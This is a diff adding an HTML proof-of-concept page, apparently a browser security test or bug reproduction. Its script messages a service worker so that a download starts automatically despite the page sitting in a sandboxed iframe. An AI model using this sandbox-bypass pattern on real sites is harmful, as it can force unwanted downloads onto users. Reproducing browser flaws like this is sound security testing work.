@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>PoC</title>
+		<script>
+			if ("serviceWorker" in navigator) {
+				addEventListener("load", async () => {
+					navigator.serviceWorker.ready.then((reg) => {
+						reg.active.postMessage({ action: "download "});
+					});
+				});
+			}
+		</script>
+	</head>
+	<body>
+		<br>
+		<center>
+			<h1>A download will start automatically even though the iframe is sandboxed.</h1>
+		</center>
+	</body>
+</html>
